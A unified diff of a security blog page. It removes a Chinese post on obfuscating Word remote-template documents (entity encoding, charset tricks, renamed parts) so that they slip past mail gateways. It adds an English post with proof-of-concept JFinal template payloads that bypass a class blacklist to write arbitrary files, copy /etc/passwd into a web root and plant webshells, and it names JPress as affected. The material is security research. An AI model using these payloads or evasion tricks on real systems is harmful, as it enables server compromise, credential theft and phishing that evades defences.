@@ -10,7 +10,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="turn1tup&#39;s blog">
-<meta property="og:url" content="https://turn1tup.github.io/page/3/index.html">
+<meta property="og:url" content="https://turn1tup.github.io/page/12/index.html">
 <meta property="og:site_name" content="turn1tup&#39;s blog">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="turn1tup">
@@ -152,61 +152,44 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-word远程模板文档混淆" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-JFinalCodeExecution" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/">word远程模板文档混淆</a>
+      <a class="article-title" href="/2021/04/15/JFinalCodeExecution/">JFinalCodeExecution</a>
     </h1>
   
 
         
-        <a href="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/" class="archive-article-date">
-  	<time datetime="2021-10-21T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-20</time>
+        <a href="/2021/04/15/JFinalCodeExecution/" class="archive-article-date">
+  	<time datetime="2021-04-15T14:09:06.103Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-15</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="远程模板及文档混淆"><a href="#远程模板及文档混淆" class="headerlink" title="远程模板及文档混淆"></a>远程模板及文档混淆</h1><p>通过远程模板的方式，我们可以使得邮件中发送的docx文档不直接带宏，对规避免杀有帮助。通常的手法是修改 <code>word/_rels/settings.xml.rels</code>中的relationship标签的Target值为远程的DOTM文档</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Relationships</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/relationships"</span>&gt;</span><span class="tag">&lt;<span class="name">Relationship</span> <span class="attr">Id</span>=<span class="string">"rId1"</span> <span class="attr">Type</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</span> <span class="attr">Target</span>=<span class="string">"https://xxx.xxx.xxx/xx.dotm"</span> <span class="attr">TargetMode</span>=<span class="string">"External"</span>/&gt;</span><span class="tag">&lt;/<span class="name">Relationships</span>&gt;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="JFinal-Code-Execution"><a href="#JFinal-Code-Execution" class="headerlink" title="JFinal Code Execution"></a>JFinal Code Execution</h1><p>JFinal is a Java Web framework with front-end rendering function. If its front-end template allows users to edit, it will cause code execution vulnerability. JFinal itself does some blacklist restrictions, but there are bypass problems.</p>
+<p>JFinal only allows users to invoke static methods, and in com.jfinal.template.expr.ast.MethodKit we can see JFinal do some blacklist to restrict code execution. After debugging, we found a total of 16 classes that were masked.</p>
+<p><img src="/2021/04/15/JFinalCodeExecution/block_class.png" alt></p>
+<p>But most Web applications contain a number of third-party libraries that are available in static methods.</p>
+<p>I have push an example on gihub  ( <a href="https://github.com/turn1tup/JFinalTest" target="_blank" rel="noopener">https://github.com/turn1tup/JFinalTest</a>), you can use this code example to understand  this vul.</p>
+<p>This is the Class  used to render a html page and which triggering holes.</p>
+<p><img src="/2021/04/15/JFinalCodeExecution/TestMain.png" alt></p>
+<p>We circumvented JFinal’s blacklist policy by using third-party libraries</p>
+<p>The POC can upload any file to any location of the server, we can write the SSH public key, timing task or webshell to  getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#set(uri&#x3D;java.net.URI::create(&quot;https:&#x2F;&#x2F;github.com&#x2F;turn1tup&#x2F;JFinalTest&#x2F;blob&#x2F;main&#x2F;README.md&quot;))</span><br><span class="line">#set(url&#x3D;uri.toURL())</span><br><span class="line">#set(paths&#x3D;java.nio.file.Paths::get(&quot;D:&#x2F;&quot;, &quot;success.txt&quot;))</span><br><span class="line">#(org.apache.commons.io.file.PathUtils::copyFile(url, paths))</span><br></pre></td></tr></table></figure>
 
-<p>该手法总所周知，防护实体可能会检测Target这一字段，并对文档进行拦截，下面笔者说一下对文档的混淆思路，避免因远程模板特征直接被邮件网关拦截。</p>
-<h2 id="XML特性"><a href="#XML特性" class="headerlink" title="XML特性"></a>XML特性</h2><p>我们知道，在web漏洞利用时，payload为xml/soap时，我们可以利用其XML特性来bypass WAF，这里也同样适用。</p>
-<h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>编码脚本可以参考 <a href="https://github.com/turn1tup/scriptlet/blob/main/encoder.py" target="_blank" rel="noopener">https://github.com/turn1tup/scriptlet/blob/main/encoder.py</a></p>
-<p>针对<code>Target</code>值我们可以使用的编码方式：HTML-10进制、HTML-16进制、HTML畸形编码，对应<code>encoder.py</code>输出的 html_entity_data_decimal、html_entity_data_hex、html_entity_data_spe</p>
-<p><img src="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/encoder.png" alt></p>
-<p>使用HTML畸形编码我们可以获得如下文档：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;Relationships xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;package&#x2F;2006&#x2F;relationships&quot;&gt;&lt;Relationship Id&#x3D;&quot;rId1&quot; Type&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;relationships&#x2F;attachedTemplate&quot; Target&#x3D;&quot;&amp;#x0000068;&amp;#0000116;&amp;#x00074;&amp;#0000112;&amp;#x0000073;&amp;#00058;&amp;#x000002f;&amp;#0000047;&amp;#x00078;&amp;#000120;&amp;#x0000078;&amp;#000046;&amp;#x0000078;&amp;#00000120;&amp;#x000078;&amp;#000046;&amp;#x000078;&amp;#0000120;&amp;#x00078;&amp;#0000047;&amp;#x000078;&amp;#0000120;&amp;#x0002e;&amp;#0000100;&amp;#x0006f;&amp;#000116;&amp;#x000006d;&quot; TargetMode&#x3D;&quot;External&quot;&#x2F;&gt;&lt;&#x2F;Relationships&gt;</span><br></pre></td></tr></table></figure>
+<p>This POC can copy any file to any location of the server, and then we can access the file from http</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set(srcFile&#x3D;java.nio.file.Paths::get(&quot;&#x2F;etc&#x2F;passwd&quot;))</span><br><span class="line">#set(dstPath&#x3D;java.nio.file.Paths::get(&quot;&#x2F;root&#x2F;starter&#x2F;webapp&#x2F;&quot;))</span><br><span class="line">#(org.apache.commons.io.file.PathUtils::copyFileToDirectory(srcFile, dstPath))</span><br></pre></td></tr></table></figure>
 
-<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>通过修改xml头部标签的<code>encoding</code>字符集声明，并转换xml文档为对应的字符集，我们可以混淆整个xml文档</p>
-<p>脚本参考 <a href="https://github.com/turn1tup/scriptlet/blob/main/charset_test.py" target="_blank" rel="noopener">https://github.com/turn1tup/scriptlet/blob/main/charset_test.py</a></p>
-<p>我们可以使用的字符集有 utf-16le 、utf-16be、utf-32le、utf-32be（另外微软的软件通常比较支持UTF-7，但这个字符集不好测试），在脚本中填入我们的 <code>settings.xml.rels</code>的原始内容，并修改<code>encoding</code>字段，运行脚本后使用获得的<code>setings.xml.rels</code>文件覆盖原始docx文档的 <code>word/rels/settings.xml/rels</code>文件即可。另外注意，我们使用记事本打开UTF16文档看到的内容与UTF8文档没有差异，但实际前者为后者2倍大小。</p>
-<p><img src="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/charset_test.png" alt></p>
-<h2 id="修改文档位置"><a href="#修改文档位置" class="headerlink" title="修改文档位置"></a>修改文档位置</h2><p><code>word/_rels/settings.xml.rels</code>的位置是可变动的</p>
-<p>一般使用远程模板加载DOTM手法时，修改的文件为word/rels/settings.xml.res</p>
-<p>我们可以修改为其他文件，过程如下：</p>
-<p>①修改<code>[Content_Types].xml</code>中的<code>/word/settings.xml</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Override PartName&#x3D;&quot;&#x2F;word&#x2F;settings.xml&quot; ContentType&#x3D;&quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.settings+xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<p>Use this POC the get the webapp dir.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set(fileSys&#x3D;java.nio.file.FileSystems::getDefault())</span><br></pre></td></tr></table></figure>
 
-<p>这里修改为<code>/word/foo.xml</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Override PartName&#x3D;&quot;&#x2F;word&#x2F;foo.xml&quot; ContentType&#x3D;&quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.settings+xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>②同步修改的文件名称</p>
-<p><code>word/_rels/setting.xml</code> -&gt;<code>word/_rels/foo.xml</code> </p>
-<p><code>word/_rels/settings.xml.rels</code> -&gt;<code>word/_rels/foo.xml.rels</code></p>
-<p>③<code>word/rels/document.xml.rels</code>中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Relationship Id&#x3D;&quot;rId6&quot; Type&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;relationships&#x2F;settings&quot; Target&#x3D;&quot;setting.xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>修改为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Relationship Id&#x3D;&quot;rId6&quot; Type&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;relationships&#x2F;settings&quot; Target&#x3D;&quot;foo.xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-
+<p>For example, JPress (<a href="https://github.com/JPressProjects/jpress" target="_blank" rel="noopener">https://github.com/JPressProjects/jpress</a>) is the  Web application that uses JFinal and has this code execution problem.</p>
 
       
 
@@ -219,7 +202,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/04/15/JFinalCodeExecution/">展开全文 >></a>
         </p>
       
 
@@ -251,7 +234,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/11/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/13/">Next &amp;raquo;</a>
     </nav>
   
 
